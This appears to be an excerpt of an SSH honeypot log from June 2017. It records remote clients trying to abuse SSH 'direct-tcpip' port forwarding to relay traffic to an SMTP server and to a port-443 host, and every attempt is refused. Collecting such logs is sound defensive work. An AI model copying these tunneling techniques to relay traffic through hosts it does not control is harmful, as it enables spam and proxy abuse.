+2017-06-17T15:57:46+0000 [SSHChannel None (145) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] remote close
+2017-06-17T15:57:51+0000 [SSHChannel None (146) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] direct-tcp forward to 65.54.188.110:25 with data 'QUIT\r\n'
+2017-06-17T15:57:51+0000 [SSHChannel None (146) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] failed to connect: Connection refused
+2017-06-17T15:57:51+0000 [SSHChannel None (146) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] sending close 146
+2017-06-17T15:57:51+0000 [SSHChannel None (146) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] remote eof
+2017-06-17T15:57:51+0000 [SSHChannel None (146) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] remote close
+2017-06-17T15:57:54+0000 [SSHChannel None (147) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] remote eof
+2017-06-17T15:57:54+0000 [SSHChannel None (147) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] remote close
+2017-06-17T15:57:54+0000 [SSHChannel None (147) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] sending close 147
+2017-06-17T15:57:57+0000 [SSHChannel None (148) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] remote eof
+2017-06-17T15:57:57+0000 [SSHChannel None (148) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] remote close
+2017-06-17T15:57:57+0000 [SSHChannel None (148) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3424,91.195.103.183] sending close 148
+2017-06-17T15:58:01+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,3436,91.195.103.219] got channel 'direct-tcpip' request
+2017-06-17T15:58:01+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,3436,91.195.103.219] direct-tcp connection request to 95.213.11.139:443 from localhost:5556
+2017-06-17T15:58:01+0000 [SSHChannel None (32) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3436,91.195.103.219] direct-tcp forward to 95.213.11.139:443 with data "\x16\x03\x01\x01.\x01\x00\x01*\x03\x03\xf25\x00,\xa1\xb3\xe7\x17\xc7w\x9c\xb7r1\x8e\xebo\xef\xfc\x0f4\xa0\x8a\xafw0h&\xcf#\xfd\xd8\x00\x00\xac\xc00\xc0,\xc0(\xc0$\xc0\x14\xc0\n\x00\xa5\x00\xa3\x00\xa1\x00\x9f\x00k\x00j\x00i\x00h\x009\x008\x007\x006\x00\x88\x00\x87\x00\x86\x00\x85\xc02\xc0.\xc0*\xc0&\xc0\x0f\xc0\x05\x00\x9d\x00=\x005\x00\x84\xc0/\xc0+\xc0'\xc0#\xc0\x13\xc0\t\x00\xa4\x00\xa2\x00\xa0\x00\x9e\x00g\x00@\x00?\x00>\x003\x002\x001\x000\x00\x9a\x00\x99\x00\x98\x00\x97\x00E\x00D\x00C\x00B\xc01\xc0-\xc0)\xc0%\xc0\x0e\xc0\x04\x00\x9c\x00<\x00/\x00\x96\x00A\x00\x07\xc0\x11\xc0\x07\xc0\x0c\xc0\x02\x00\x05\x00\x04\xc0\x12\xc0\x08\x00\x16\x00\x13\x00\x10\x00\r\xc0\r\xc0\x03\x00\n\x00\xff\x01\x00\x00U\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x00\x1c\x00\x1a\x00\x17\x00\x19\x00\x1c\x00\x1b\x00\x18\x00\x1a\x00\x16\x00\x0e\x00\r\x00\x0b\x00\x0c\x00\t\x00\n\x00#\x00\x00\x00\r\x00 \x00\x1e\x06\x01\x06\x02\x06\x03\x05\x01\x05\x02\x05\x03\x04\x01\x04\x02\x04\x03\x03\x01\x03\x02\x03\x03\x02\x01\x02\x02\x02\x03\x00\x0f\x00\x01\x01"
+2017-06-17T15:58:01+0000 [SSHChannel None (32) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3436,91.195.103.219] failed to connect: Connection refused
+2017-06-17T15:58:01+0000 [SSHChannel None (32) on SSHService 'ssh-connection' on HoneyPotSSHTransport,3436,91.195.103.219] sending close 32
